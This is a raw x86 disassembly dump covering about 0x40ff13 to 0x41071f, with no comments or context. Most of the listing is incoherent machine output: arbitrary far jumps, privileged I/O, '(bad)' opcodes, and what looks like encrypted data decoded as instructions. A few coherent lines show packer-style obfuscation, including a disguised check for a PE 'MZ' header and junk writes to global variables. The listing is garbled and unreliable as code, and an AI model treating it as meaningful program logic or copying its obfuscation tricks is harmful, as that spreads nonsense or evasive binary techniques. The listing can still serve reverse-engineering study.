  40ff13:	add    edi,DWORD PTR [edi]
  40ff15:	jne    0x40ff01
  40ff17:	push   ecx
  40ff18:	cmp    ebp,DWORD PTR [edi-0x15327815]
  40ff1e:	rol    BYTE PTR ds:0x7db2a3ac,cl
  40ff24:	xchg   ebx,eax
  40ff25:	inc    ebp
  40ff26:	lds    ebx,FWORD PTR [ecx+ebx*8+0x52]
  40ff2a:	inc    edi
  40ff2b:	mov    ecx,0x2175b3e2
  40ff30:	js     0x40ff2d
  40ff32:	jns    0x40ff3e
  40ff34:	pop    eax
  40ff35:	dec    ebx
  40ff36:	dec    esi
  40ff37:	into   
  40ff38:	push   es
  40ff39:	sub    dl,BYTE PTR [esi-0x1b]
  40ff3c:	ins    BYTE PTR es:[edi],dx
  40ff3d:	pop    dx
  40ff3f:	push   ebp
  40ff40:	xor    al,0x8c
  40ff42:	xor    al,0xd0
  40ff44:	or     ebp,DWORD PTR [esi+0x4a]
  40ff47:	push   ebp
  40ff48:	jnp    0x40ffc7
  40ff4a:	fimul  DWORD PTR [esi+eax*2]
  40ff4d:	push   0xffffffd0
  40ff4f:	push   ebx
  40ff50:	mov    ch,BYTE PTR [ecx-0x3fb0540b]
  40ff56:	pop    edi
  40ff57:	mov    esi,0xe6fcfbe9
  40ff5c:	or     ch,BYTE PTR [ebx]
  40ff5e:	sbb    ch,BYTE PTR [eax-0x350c9b00]
  40ff64:	cmc    
  40ff65:	nop
  40ff66:	fimul  DWORD PTR [edx+ebx*4]
  40ff69:	push   edx
  40ff6a:	ins    DWORD PTR es:[edi],dx
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e134,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	je     0x410026
  40ffde:	in     eax,dx
  40ffdf:	repz xor eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x40ff97
  40ffe9:	pushf  
  40ffea:	rol    DWORD PTR [eax],1
  40ffec:	fcomp  QWORD PTR [edi+0x4c4e76cd]
  40fff2:	pushf  
  40fff3:	out    dx,eax
  40fff4:	push   ebp
  40fff5:	dec    ebp
  40fff6:	repz test al,0xc0
  40fff9:	mov    ebp,0x52ad4aa
  40fffe:	push   ebx
  40ffff:	cmp    DWORD PTR [eax],edx
  410001:	sbb    al,0x31
  410003:	jg     0x410014
  410005:	enter  0x1e55,0xbd
  410009:	into   
  41000a:	popa   
  41000b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41000c:	stos   DWORD PTR es:[edi],eax
  41000d:	ins    BYTE PTR es:[edi],dx
  41000e:	sbb    DWORD PTR [ebx-0x2d6cf9dd],0x6a
  410015:	fld    TBYTE PTR ds:0x2d9e9520
  41001b:	push   0xfffffff8
  41001d:	cmp    ecx,DWORD PTR [edx-0x732b0175]
  410023:	push   ebx
  410024:	ficomp DWORD PTR [eax]
  410026:	xor    ebx,DWORD PTR ds:0xca363adb
  41002c:	ja     0x40ffd5
  41002e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41002f:	cwde   
  410030:	aaa    
  410031:	aas    
  410032:	lahf   
  410033:	outs   dx,DWORD PTR ds:[esi]
  410034:	adc    eax,0x9a7b3927
  410039:	jmp    0x410053
  41003b:	pushf  
  41003c:	jmp    0xf0d8:0x4bdb1a80
  410043:	cli    
  410044:	xor    DWORD PTR [ecx+0x63d7cc97],ebx
  41004a:	xchg   esi,eax
  41004b:	jl     0x41002b
  41004d:	call   0x1828:0x6645e47d
  410054:	sub    BYTE PTR [esi-0x69],bl
  410057:	pop    esi
  410058:	mov    ds:0xd1b137c1,al
  41005d:	aas    
  41005e:	xchg   edi,eax
  41005f:	daa    
  410060:	iret   
  410061:	nop
  410062:	cmp    BYTE PTR [eax-0x4bb83d5d],0xf8
  410069:	adc    eax,0xbfe8614a
  41006e:	fisttp WORD PTR [ecx+ecx*2]
  410071:	leave  
  410072:	enter  0x63b1,0xcb
  410076:	in     al,dx
  410077:	adc    ah,dh
  410079:	adc    eax,0x1d08b511
  41007e:	mov    ebx,0xefeffdc5
  410083:	mov    ebp,0xec2ff562
  410088:	enter  0xdab4,0xd5
  41008c:	pop    ebx
  41008d:	sub    DWORD PTR [esi-0x67],edx
  410090:	call   0xeef5:0x4553e4cc
  410097:	jmp    0xc60:0x164df7bd
  41009e:	js     0x41004b
  4100a0:	popa   
  4100a1:	mov    ah,0xbe
  4100a3:	adc    al,0x24
  4100a5:	pop    ebp
  4100a6:	std    
  4100a7:	mov    ds:0xdab364b8,al
  4100ac:	push   edi
  4100ad:	test   al,0x2f
  4100af:	adc    edi,edx
  4100b1:	sbb    ebp,DWORD PTR [edx+eax*2-0x3a035405]
  4100b8:	fist   DWORD PTR [ebx-0x1a161f65]
  4100be:	jmp    0x3c89083c
  4100c3:	scas   eax,DWORD PTR es:[edi]
  4100c4:	shl    BYTE PTR [edx-0xe],1
  4100c7:	inc    eax
  4100c8:	fimul  DWORD PTR [ecx]
  4100ca:	jne    0x4100bd
  4100cc:	int3   
  4100cd:	push   ecx
  4100ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100cf:	inc    ecx
  4100d0:	pusha  
  4100d1:	mov    eax,ds:0x7db83716
  4100d6:	nop
  4100d7:	mul    BYTE PTR [edx-0x5dd81307]
  4100dd:	mov    dh,0xfc
  4100df:	aas    
  4100e0:	xchg   ecx,eax
  4100e1:	mov    esi,0x5bb739ec
  4100e6:	pusha  
  4100e7:	mov    edx,0x91ddeae6
  4100ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100ed:	jns    0x41007c
  4100ef:	dec    ebx
  4100f0:	outs   dx,BYTE PTR ds:[esi]
  4100f1:	push   ss
  4100f2:	retf   0x3354
  4100f5:	push   cs
  4100f6:	mov    edx,0x25cc38ef
  4100fb:	pushf  
  4100fc:	sbb    BYTE PTR [edx],dl
  4100fe:	adc    esp,DWORD PTR [eax+0x33ca2253]
  410104:	cs dec ebp
  410106:	rol    DWORD PTR [ebp+0x55],0xb1
  41010a:	in     al,dx
  41010b:	mov    WORD PTR [edx-0x3e],es
  41010e:	sbb    DWORD PTR [eax+0x49],ebx
  410111:	push   ss
  410112:	rcr    DWORD PTR [edx],1
  410114:	mov    dl,0x73
  410116:	add    cl,cl
  410118:	mov    cl,0xd0
  41011a:	outs   dx,DWORD PTR ds:[esi]
  41011b:	in     eax,dx
  41011c:	adc    BYTE PTR [edx+ebp*1+0x1e39b9dd],dl
  410123:	jbe    0x4100d9
  410125:	pop    ebp
  410126:	ins    BYTE PTR es:[edi],dx
  410127:	mov    ebp,0xd7bf4b4e
  41012c:	inc    esp
  41012d:	das    
  41012e:	inc    ebx
  41012f:	or     bl,BYTE PTR [ecx]
  410131:	in     eax,0x43
  410133:	sbb    eax,0x280e5634
  410138:	int3   
  410139:	jmp    0x2b3a851
  41013e:	mov    esp,0xee68674a
  410143:	aam    0xc9
  410145:	jge    0x41011d
  410147:	js     0x410132
  410149:	inc    ecx
  41014a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41014b:	iret   
  41014c:	maskmovq mm7,(bad)
  41014d:	idiv   DWORD PTR ds:0x2c7bd068
  410153:	jno    0x4100f0
  410155:	sbb    dh,BYTE PTR ds:0x93bf0fb4
  41015b:	xchg   BYTE PTR [esi-0x72d2a14a],cl
  410161:	lods   eax,DWORD PTR ds:[esi]
  410162:	jbe    0x410146
  410164:	add    DWORD PTR [ebx+0x4e],edi
  410167:	jae    0x41011b
  410169:	in     eax,0x49
  41016b:	xchg   DWORD PTR [eax+0x12],esi
  41016e:	jge    0x4101cd
  410170:	nop
  410171:	xchg   ebp,eax
  410172:	and    al,0x26
  410174:	es adc al,0x30
  410177:	and    eax,0xcfa37a89
  41017c:	and    BYTE PTR [edx-0x6db70a6c],0x66
  410183:	lahf   
  410184:	in     al,dx
  410185:	adc    edx,DWORD PTR [eax+0x7c]
  410188:	hlt    
  410189:	mov    ah,0x20
  41018b:	mov    ecx,0xe67f6822
  410190:	push   ebp
  410191:	inc    edx
  410192:	inc    edi
  410193:	pop    ebx
  410194:	pop    ebp
  410195:	sbb    BYTE PTR [ecx-0x7],al
  410198:	(bad)  [edi+ebp*4+0x1f]
  41019c:	int3   
  41019d:	xor    eax,0xb3e48ccc
  4101a2:	nop
  4101a3:	call   0x91a3:0x944b9930
  4101aa:	cmp    eax,DWORD PTR [esi*4+0x5e82e9ce]
  4101b1:	fdivp  st(2),st
  4101b3:	stc    
  4101b4:	aad    0x39
  4101b6:	and    eax,0xf8f874c8
  4101bb:	ror    DWORD PTR [esi+0x30],0xa1
  4101bf:	call   0x2701856c
  4101c4:	repnz and esp,edi
  4101c7:	(bad)  
  4101c8:	jp     0x410180
  4101ca:	mov    BYTE PTR [ebp-0x4749ca4a],bl
  4101d0:	in     al,0x40
  4101d2:	and    eax,DWORD PTR [edi-0x19f0a94]
  4101d8:	mov    edx,0xd8f26622
  4101dd:	and    al,0x9b
  4101df:	bound  esp,QWORD PTR [edx+eiz*8+0x56]
  4101e3:	int3   
  4101e4:	add    eax,0x2660d495
  4101e9:	lea    edx,[ecx]
  4101eb:	mov    ds,WORD PTR [ecx+0x7631452a]
  4101f1:	out    dx,eax
  4101f2:	pop    ebp
  4101f3:	mov    cl,0xba
  4101f5:	or     edx,eax
  4101f7:	sub    edx,DWORD PTR [esi]
  4101f9:	ins    BYTE PTR es:[edi],dx
  4101fa:	iret   
  4101fb:	jecxz  0x410270
  4101fd:	sti    
  4101fe:	(bad)  
  410200:	mov    cl,0x5c
  410202:	ins    BYTE PTR es:[edi],dx
  410203:	nop
  410204:	add    eax,DWORD PTR [ebp+0x7e]
  410207:	dec    ecx
  410208:	fistp  WORD PTR [esi+0x50a9858a]
  41020e:	stos   DWORD PTR es:[edi],eax
  41020f:	sub    ecx,DWORD PTR [esi+0x739b5b52]
  410215:	fstp   QWORD PTR [edi]
  410217:	cmp    al,0x3b
  410219:	pop    edx
  41021a:	push   edx
  41021b:	shl    ebx,1
  41021d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41021e:	gs loopne 0x41024c
  410221:	inc    ebx
  410222:	dec    eax
  410223:	test   eax,0x8857075
  410228:	loopne 0x4102a7
  41022a:	dec    esp
  41022b:	out    dx,eax
  41022c:	icebp  
  41022d:	cmp    DWORD PTR ds:0xf3fa1ed5,edi
  410233:	icebp  
  410234:	arpl   WORD PTR [eax],si
  410236:	cli    
  410237:	imul   esp,DWORD PTR [esi],0xc9b7a8d7
  41023d:	mov    ch,0x58
  41023f:	pop    edi
  410240:	pop    ss
  410241:	jmp    0xa49089e8
  410246:	adc    cl,BYTE PTR [ecx-0x42]
  410249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41024a:	or     eax,0x36341c21
  41024f:	loop   0x41025d
  410251:	cmc    
  410252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410253:	or     bl,cl
  410255:	mov    al,0x91
  410257:	or     eax,0xe34d4bda
  41025c:	push   es
  41025d:	cdq    
  41025e:	push   edx
  41025f:	shl    BYTE PTR [esi+0x34605753],0xc5
  410266:	sub    al,0xef
  410268:	push   0x33
  41026a:	xlat   BYTE PTR ds:[ebx]
  41026b:	popa   
  41026c:	or     al,BYTE PTR [ebp-0x2e32acfe]
  410272:	std    
  410273:	xor    dh,ch
  410275:	pusha  
  410276:	repz mov al,ds:0xb2711a0c
  41027c:	xlat   BYTE PTR ds:[ebx]
  41027d:	in     eax,dx
  41027e:	dec    esi
  41027f:	lods   al,BYTE PTR ds:[esi]
  410280:	inc    edx
  410282:	sti    
  410283:	aaa    
  410284:	sub    BYTE PTR [ebx+0x761d9fa8],cl
  41028a:	push   ebx
  41028b:	sub    eax,edx
  41028d:	std    
  41028e:	dec    eax
  41028f:	sub    eax,0x27ab1037
  410294:	cs pop ss
  410296:	js     0x41021f
  410298:	cdq    
  410299:	adc    eax,0x416d5282
  41029e:	push   es
  41029f:	xor    ebx,ebx
  4102a1:	sbb    DWORD PTR [ebx-0x619e858b],esp
  4102a7:	fdivr  QWORD PTR ds:0xa006cb2e
  4102ad:	mov    ecx,0x830f2860
  4102b2:	jmp    0xfc72a723
  4102b7:	sbb    eax,0x7e14ef04
  4102bc:	fdiv   QWORD PTR [edi]
  4102be:	call   0xbe7:0x7935f249
  4102c5:	mov    ch,0x39
  4102c7:	(bad)  
  4102c8:	call   0x1b48a216
  4102cd:	(bad)  
  4102ce:	int3   
  4102cf:	ja     0x410309
  4102d1:	xor    al,0x51
  4102d3:	or     esi,ecx
  4102d5:	jcxz   0x4102e9
  4102d8:	das    
  4102d9:	cld    
  4102da:	jmp    0x410338
  4102dc:	pop    ecx
  4102dd:	(bad)  [edx+edx*4-0x4942a96f]
  4102e4:	sbb    eax,0xb30e44c9
  4102e9:	push   ss
  4102ea:	in     al,0x36
  4102ec:	(bad)  
  4102ed:	jae    0x410307
  4102ef:	fisub  WORD PTR [ebx+0x140027a7]
  4102f5:	sub    eax,0x7c1815e1
  4102fa:	fisubr DWORD PTR [ebx]
  4102fc:	or     BYTE PTR [ecx],ah
  4102fe:	rcl    DWORD PTR [eax-0x35],0xf3
  410302:	and    dl,al
  410304:	xor    eax,0x1599d415
  410309:	gs jmp 0xae6de05e
  41030f:	sub    DWORD PTR [edi+edx*4],edi
  410312:	test   DWORD PTR [edx+eax*2],edx
  410315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410316:	imul   edx,DWORD PTR [edi+0x6a],0xffffffab
  41031a:	dec    ebp
  41031b:	xchg   eax,ecx
  41031d:	sub    dh,cl
  41031f:	retf   0x1bda
  410322:	sbb    BYTE PTR [ebp+0x7e00ee98],0x5b
  410329:	popa   
  41032a:	loope  0x41038a
  41032c:	mov    ch,0x8c
  41032e:	jge    0x410345
  410330:	mov    DWORD PTR [ecx-0x3d],esp
  410333:	and    DWORD PTR [esi],0xffffffb6
  410336:	fwait
  410337:	xchg   esi,eax
  410338:	in     al,0x2f
  41033a:	(bad)  
  41033b:	sbb    eax,DWORD PTR [ebp-0x38ae93b3]
  410341:	in     al,dx
  410342:	push   edi
  410343:	inc    ebx
  410344:	int3   
  410345:	mov    eax,ds:0xc8223d30
  41034a:	fstp   TBYTE PTR [edx]
  41034c:	ss xchg ecx,eax
  41034e:	call   0xd73d5289
  410353:	or     bh,BYTE PTR [ecx-0x199a0bfb]
  410359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41035a:	loop   0x41031b
  41035c:	jae    0x4103d3
  41035e:	push   eax
  41035f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410360:	shl    DWORD PTR [eax-0xa],0x2d
  410364:	add    al,0x65
  410366:	data16 shr BYTE PTR [ebp+0x6f],cl
  41036a:	cwde   
  41036b:	and    eax,0x58fbb500
  410370:	sub    ch,BYTE PTR [edx]
  410372:	xor    eax,0x20c30d92
  410377:	mov    DWORD PTR [ebx],eax
  410379:	ret    0x1c23
  41037c:	pop    es
  41037d:	mov    ebp,0xe7513309
  410382:	test   eax,0x27c86121
  410387:	ror    DWORD PTR [ebp-0x39e59a57],0x3c
  41038e:	arpl   WORD PTR ds:0x293481a4,ax
  410394:	ja     0x41031f
  410396:	dec    ebp
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0xc10f:0x6eedbab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	mov    ebx,0x2c72859b
  4103df:	popa   
  4103e0:	push   esp
  4103e1:	xor    DWORD PTR [ebx-0x52b8583b],0xffffffab
  4103e8:	test   al,0x8f
  4103ea:	sub    ah,BYTE PTR [edi+ebp*8+0x67]
  4103ee:	outs   dx,BYTE PTR ds:[esi]
  4103ef:	neg    DWORD PTR [esi]
  4103f1:	adc    eax,0x33c7917e
  4103f6:	mov    ah,0x3d
  4103f8:	mov    WORD PTR [esi],fs
  4103fa:	jmp    0xb0797f98
  4103ff:	or     BYTE PTR [edx+0x7],0xe1
  410403:	ret    
  410404:	and    ah,ch
  410406:	inc    esi
  410407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410408:	add    DWORD PTR cs:[eax],0xac218ff
  41040f:	in     al,0xd4
  410411:	out    0x5d,al
  410413:	cmc    
  410414:	dec    edi
  410415:	mov    edx,0xcdde1521
  41041a:	sub    cl,BYTE PTR [edx-0x76]
  41041d:	add    ecx,DWORD PTR [edi+0x6c]
  410420:	cld    
  410421:	pop    ebp
  410422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410423:	dec    eax
  410424:	adc    ecx,DWORD PTR [edx-0x2e24e8ab]
  41042a:	cmp    DWORD PTR [ecx-0x39],eax
  41042d:	xor    bh,BYTE PTR [esp+ecx*2-0x3f]
  410431:	test   BYTE PTR [eax],dl
  410433:	cmp    ebp,DWORD PTR [ebp+0x71]
  410436:	mov    bl,0x4c
  410439:	jl     0x4103da
  41043b:	aas    
  41043c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41043d:	daa    
  41043e:	arpl   WORD PTR [eax],cx
  410440:	adc    eax,DWORD PTR [esi]
  410442:	jmp    0x4c07de59
  410447:	push   ebx
  410448:	mov    ebx,0xd4ca57e4
  41044d:	ficomp DWORD PTR ds:0x540daef5
  410453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410454:	inc    ebp
  410455:	loopne 0x4103e4
  410457:	sub    BYTE PTR [eax+esi*1+0x34de295a],dh
  41045e:	mov    ds:0x2be40d21,al
  410463:	(bad)  
  410464:	xchg   ecx,eax
  410465:	in     al,0xa2
  410467:	dec    ebx
  410468:	jns    0x4104a8
  41046a:	cmp    eax,esp
  41046c:	push   eax
  41046d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41046e:	jo     0x4104ac
  410470:	sbb    eax,0x1ca7f129
  410475:	stos   BYTE PTR es:[edi],al
  410476:	sahf   
  410477:	or     bl,BYTE PTR [ebp-0x63]
  41047a:	add    al,BYTE PTR [bx+si+0x36]
  41047e:	inc    eax
  41047f:	pop    edx
  410480:	and    ebx,0xdc17dea
  410486:	mov    esp,0xc533d30b
  41048b:	push   ecx
  41048c:	lods   al,BYTE PTR ds:[esi]
  41048d:	cld    
  41048e:	or     dh,bl
  410490:	mov    ecx,0xf2be3bc6
  410495:	push   0xffffffc0
  410497:	scas   eax,DWORD PTR es:[edi]
  410498:	lahf   
  410499:	mov    ebp,0x4139a720
  41049e:	sbb    esi,DWORD PTR [ebp-0x60e6d523]
  4104a4:	pop    ss
  4104a5:	and    al,0xca
  4104a7:	retf   
  4104a8:	jle    0x41049d
  4104aa:	jmp    0x1dac7419
  4104af:	fld    QWORD PTR [ebx-0x7b6c4e3f]
  4104b5:	inc    esi
  4104b6:	pop    DWORD PTR [eax+ebp*4]
  4104b9:	cmp    BYTE PTR [ebp-0x357ba51a],bh
  4104bf:	repnz xchg esi,eax
  4104c1:	add    al,0xb3
  4104c3:	in     eax,dx
  4104c4:	sub    BYTE PTR [esi+0x312484d],0x69
  4104cb:	lahf   
  4104cc:	retf   
  4104cd:	inc    esi
  4104ce:	pop    edx
  4104cf:	cwde   
  4104d0:	popa   
  4104d1:	jo     0x4104be
  4104d3:	shl    DWORD PTR [edi],0x47
  4104d6:	jo     0x410482
  4104d8:	push   ds
  4104d9:	fst    QWORD PTR [esi+0x7b]
  4104dc:	push   ss
  4104dd:	xor    al,0x33
  4104df:	neg    DWORD PTR [ecx+0x1b]
  4104e2:	push   ss
  4104e3:	mov    ds:0x3c89283b,al
  4104e8:	mov    ?,WORD PTR [edi-0x2d686b85]
  4104ee:	dec    edi
  4104ef:	push   esp
  4104f0:	div    BYTE PTR [ecx+0x17320df5]
  4104f6:	mov    dl,0x4d
  4104f8:	test   BYTE PTR ds:[ebx-0x76fca1cc],ah
  4104ff:	pop    ss
  410500:	mov    al,0x5f
  410502:	dec    ebp
  410503:	cmc    
  410504:	cdq    
  410505:	push   ds
  410506:	mov    ds,edx
  410508:	sbb    eax,0xd11a2556
  41050d:	call   DWORD PTR [eax+0x73]
  410510:	inc    esp
  410511:	mov    ebp,DWORD PTR [ecx-0x4fb77add]
  410517:	test   DWORD PTR [esp+eiz*4-0x26],esi
  41051b:	dec    eax
  41051c:	push   ss
  41051d:	mov    al,ds:0xa1af1226
  410522:	mov    ds:0x84014bab,al
  410527:	fmul   QWORD PTR [edx+0x5]
  41052a:	mov    ch,0x45
  41052c:	pop    ss
  41052d:	add    DWORD PTR [ebx],ebp
  41052f:	in     eax,dx
  410530:	ins    BYTE PTR es:[edi],dx
  410531:	in     al,dx
  410532:	or     al,0x47
  410534:	dec    ebp
  410535:	iret   
  410536:	push   ss
  410537:	in     al,0x9d
  410539:	jmp    0x71b3a480
  41053e:	pop    edx
  41053f:	add    eax,0x4cd17f36
  410544:	ret    
  410545:	das    
  410546:	mov    al,0x5a
  410548:	call   0xc86ae4ac
  41054d:	jne    0x4105c6
  41054f:	(bad)  
  410550:	div    BYTE PTR [ebp-0x1e]
  410553:	push   esi
  410554:	pop    edx
  410555:	sbb    esp,DWORD PTR [ebx-0x77]
  410558:	dec    ebp
  410559:	int    0xd7
  41055b:	adc    eax,0x266fab34
  410560:	imul   ebp,DWORD PTR [ebp-0x642c6322],0x2629d566
  41056a:	out    0x5b,eax
  41056c:	iret   
  41056d:	outs   dx,DWORD PTR ds:[esi]
  41056e:	push   esi
  41056f:	adc    DWORD PTR [eax+ecx*4-0x66],esp
  410573:	mov    edx,0x84ba54b1
  410578:	shl    DWORD PTR [eax],0xfe
  41057b:	clc    
  41057c:	(bad)  
  41057d:	loop   0x410593
  41057f:	hlt    
  410580:	dec    edx
  410581:	ficomp DWORD PTR [eax-0x3d71ec88]
  410587:	loopne 0x4105ef
  410589:	not    DWORD PTR [ebx-0x1e]
  41058c:	cli    
  41058d:	sbb    DWORD PTR ds:0x2e74ea8d,ebx
  410593:	push   ebx
  410594:	pop    es
  410595:	(bad)  
  410596:	pushf  
  410597:	dec    edi
  410598:	in     al,dx
  410599:	dec    esi
  41059a:	pop    esp
  41059b:	adc    dh,BYTE PTR [ecx+0xd]
  41059e:	push   cs
  41059f:	cmp    esi,DWORD PTR [ecx+0x5487041e]
  4105a5:	mov    edi,0xbf81fef5
  4105aa:	adc    DWORD PTR [eax+eax*4-0x63],ebp
  4105ae:	jmp    FWORD PTR [ebx+0x5e870f5]
  4105b4:	cmc    
  4105b5:	and    bh,BYTE PTR [esi-0x66]
  4105b8:	into   
  4105b9:	aaa    
  4105ba:	retf   
  4105bb:	xor    DWORD PTR [esi-0x80],ecx
  4105be:	js     0x41055b
  4105c0:	and    edx,edi
  4105c2:	adc    DWORD PTR [esi+0x4bb62641],esi
  4105c8:	adc    al,BYTE PTR [ebx]
  4105ca:	adc    eax,edx
  4105cc:	pop    ds
  4105cd:	inc    ebp
  4105ce:	and    al,0x3f
  4105d0:	inc    ecx
  4105d1:	dec    edi
  4105d2:	call   0xbcd28e4f
  4105d7:	int    0xf
  4105d9:	mov    al,0xcd
  4105db:	xchg   ebp,eax
  4105dc:	xchg   esi,eax
  4105dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105de:	push   esi
  4105df:	jno    0x4105fb
  4105e1:	pusha  
  4105e2:	jg     0x4105e9
  4105e4:	imul   esp,DWORD PTR [esi+0x4c25a384],0x42
  4105eb:	out    0x5a,al
  4105ed:	nop
  4105ee:	leave  
  4105ef:	pop    edx
  4105f0:	sti    
  4105f1:	adc    BYTE PTR [ebx-0x5],al
  4105f4:	mov    ds:0xa0510e2f,eax
  4105f9:	mov    ebp,0x9cb6975f
  4105fe:	pop    edx
  4105ff:	fdivr  st(0),st
  410601:	outs   dx,BYTE PTR ds:[esi]
  410602:	cli    
  410603:	aas    
  410604:	jmp    0xaf139bd4
  410609:	aas    
  41060a:	ss adc al,0x84
  41060d:	mov    edi,0x6310103b
  410612:	xor    edx,edx
  410614:	or     DWORD PTR [edi-0x317971fe],ebp
  41061a:	cmp    BYTE PTR [esi],0xc0
  41061d:	dec    edx
  41061e:	lahf   
  41061f:	inc    edi
  410620:	sub    ah,BYTE PTR ds:0x59dbc37b
  410626:	or     BYTE PTR ds:0xa51fa01a,ah
  41062c:	cdq    
  41062d:	xchg   esp,eax
  41062e:	cmp    BYTE PTR [ebx-0xd],dh
  410631:	pop    ss
  410632:	xchg   ecx,eax
  410633:	push   0xa98bc8ba
  410638:	jle    0x4105bd
  41063a:	sbb    BYTE PTR [esp+ebx*8],dh
  41063d:	aam    0x9c
  41063f:	jle    0x410652
  410641:	sub    al,0xc6
  410643:	test   eax,0x1f7022f2
  410648:	pop    esp
  410649:	fsubp  st(7),st
  41064b:	lahf   
  41064c:	adc    al,0x3d
  41064e:	aaa    
  41064f:	xor    al,0x92
  410651:	ja     0x41063b
  410653:	xlat   BYTE PTR ds:[ebx]
  410654:	pand   mm5,mm6
  410657:	mov    es,WORD PTR [edi]
  410659:	jl     0x41067a
  41065b:	pop    eax
  41065c:	mov    al,0xab
  41065e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41065f:	jbe    0x4105e4
  410661:	cli    
  410662:	push   eax
  410663:	lods   al,BYTE PTR ds:[esi]
  410664:	pop    ecx
  410665:	mov    ebp,0x8a085474
  41066a:	xor    BYTE PTR ds:[eax+esi*4],bh
  41066e:	test   al,0x3e
  410670:	stos   BYTE PTR es:[edi],al
  410671:	ins    BYTE PTR es:[edi],dx
  410672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410673:	xchg   DWORD PTR [ebp-0x32],edi
  410676:	hlt    
  410677:	mov    eax,0xf39b4b35
  41067c:	push   esi
  41067d:	in     eax,0x79
  41067f:	sbb    bl,0x58
  410682:	ss (bad) 
  410684:	iret   
  410685:	and    ah,BYTE PTR [esi]
  410687:	jo     0x4106f7
  410689:	xor    DWORD PTR [eax],ebx
  41068b:	xor    esi,DWORD PTR [ebp+0x485c88e]
  410691:	shl    DWORD PTR [edx+0x34],0xfb
  410695:	push   es
  410696:	aas    
  410697:	push   edx
  410698:	je     0x41069f
  41069a:	push   0x64
  41069c:	add    eax,0x8bd9b3a0
  4106a1:	pop    edx
  4106a2:	fldenv [edi+0x211f469f]
  4106a8:	xchg   esp,eax
  4106a9:	jo     0x41065f
  4106ab:	push   esi
  4106ac:	jecxz  0x410641
  4106ae:	mov    dh,ch
  4106b0:	and    eax,eax
  4106b2:	push   esi
  4106b3:	add    DWORD PTR [edi+0x2e14eaf6],edi
  4106b9:	pop    es
  4106ba:	add    al,ch
  4106bc:	pop    esi
  4106bd:	push   ds
  4106be:	dec    esp
  4106bf:	cmp    dh,BYTE PTR [ebx+eax*4-0x39efbb13]
  4106c6:	int3   
  4106c7:	retf   
  4106c8:	outs   dx,BYTE PTR ds:[esi]
  4106c9:	shr    BYTE PTR [edx-0x73e8baef],0xc7
  4106d0:	fst    DWORD PTR [ebx-0x75]
  4106d3:	xor    BYTE PTR [eax],0x16
  4106d6:	sbb    bl,ah
  4106d8:	inc    edi
  4106d9:	xchg   esi,eax
  4106da:	adc    bh,BYTE PTR [eax+0x702197a1]
  4106e0:	lahf   
  4106e1:	jne    0x4106b2
  4106e3:	mov    WORD PTR [edx-0x616a9105],fs
  4106e9:	mov    esi,0x1e681b9c
  4106ee:	and    ebx,DWORD PTR [edx-0x4f30bf79]
  4106f4:	mov    edi,DWORD PTR [esi]
  4106f6:	pop    eax
  4106f7:	cmp    DWORD PTR [edi+0x74a4f7d5],0x7240df98
  410701:	je     0x4106f3
  410703:	lahf   
  410704:	(bad)  
  410705:	sub    esi,ecx
  410707:	shl    esp,1
  410709:	push   ss
  41070a:	sub    al,0x23
  41070c:	les    ebp,FWORD PTR ds:0xd7e15ae9
  410712:	dec    edi
  410713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410714:	add    al,bh
  410716:	jl     0x4106d9
  410718:	repnz cmp DWORD PTR ds:0xf5953b08,eax
  41071f:	call   0x5e00:0xe942a0c4
